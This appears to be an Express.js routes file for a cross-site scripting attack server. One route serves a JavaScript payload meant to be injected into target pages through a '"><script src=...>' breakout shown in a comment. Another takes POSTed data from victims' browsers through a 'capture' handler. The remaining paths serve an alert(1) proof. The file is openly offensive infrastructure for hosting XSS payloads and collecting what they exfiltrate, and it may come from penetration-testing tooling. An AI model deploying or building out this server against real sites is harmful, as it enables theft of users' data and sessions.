const xss = require('../controllers/xss');

module.exports = (app) => {
  // Whenever _ body is sent via /m/ POST it will trigger the capture request
  app.post('/m', xss.capture);
  // // Any other request will generate the JavaScript payload
  // // Which will be included in "><script src="site"></script>
  app.get('/m', xss.displayScript);
  // just shows alert(1), for normal xss.
  app.get('*', xss.displayDefault);
};
